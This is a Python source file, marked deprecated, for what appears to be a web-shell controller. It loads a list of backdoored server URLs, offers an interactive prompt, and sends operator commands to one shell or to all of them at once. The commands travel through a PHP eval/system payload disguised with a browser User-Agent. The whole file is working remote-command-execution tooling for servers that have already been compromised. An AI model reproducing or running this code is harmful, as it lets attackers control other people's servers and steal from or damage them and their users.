#!/usr/bin/python3

'''
this module is deprecated, expect no further updates
'''

import sys

import requests as r

from lib.cli import colors as clr
from lib.cli import console as csl

shells = {}


def loadShells(shell_list):
    with open(shell_list) as f:
        global shells
        n = 0
        for line in f:
            shell = line.strip()
            sys.stdout.write(
                '\r' +
                clr.CYAN +
                '[*] Loading {} ...'.format(
                    shell) +
                clr.END)
            sys.stdout.flush()
            shells.update({str(n): shell})
            n += 1
        sys.stdout.flush()
        sys.stdout.write('\n' +
                         clr.GREEN +
                         clr.BOLD +
                         '[+] Loaded {} shells from {}'.format(str(n), shell_list) +
                         clr.END +
                         '\n')
        print(
            clr.BLUE +
            clr.BOLD +
            '[*] ------------------------ Shells --------------------------------' +
            clr.END +
            '\n')
        # TODO put shells here
        for n in range(len(shells)):
            shell = shells.get(str(n))
            print('       [{}] {}'.format(str(n), shell))
        print(
            clr.BLUE +
            clr.BOLD +
            '    ----------------------------------------------------------------' +
            clr.END)


def exec_shell(target, cmd):
    exec_url = target + '?cmd={}'.format(cmd)
    print(
        '[*] Posting ' +
        clr.CYAN +
        cmd +
        clr.END +
        ' to ' +
        clr.UNDERLINE +
        exec_url +
        clr.END +
        '...\n')
    headers = {
        "User-Agent":
        "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
        "Accept":
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en,en-US;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    cookies = r.get(target, headers=headers).cookies
    post_data = 'd3ZseWptMzMK=@eval($_POST[z0]);&z0=echo system($_GET[\"cmd\"]);'
    # recv = r.post(exec_url, data=post_data, headers=headers,
    # cookies=cookies, proxies=proxy)
    recv = r.post(exec_url, data=post_data, headers=headers, cookies=cookies)
    response = recv.text
    if recv.status_code == 200:
        print(clr.GREEN + '[+] Response:\n' + clr.END + response)
        # print(recv.status_code)
    else:
        csl.print_error(recv.status_code)


def ctrl(n):
    proxy = {'http': '127.0.0.1:8080'}
    target = shells.get(n)
    while True:
        cmd = input(
            clr.PURPLE +
            clr.UNDERLINE +
            clr.BOLD +
            "shell " +
            clr.END +
            clr.PURPLE +
            "> " +
            clr.END).strip(
        )
        if cmd.lower() == 'q':
            break
        elif cmd.lower() == 'a':
            broadcast(cmd)
        else:
            exec_shell(target, cmd)


def broadcast(cmd):
    '''
    from multiprocessing import Pool
    with Pool(10) as p:
        p.map(exec_shell, shells.values(), cmd)
    '''
    for n in range(len(shells)):
        target = shells.get(str(n), '')
        exec_shell(target, cmd)
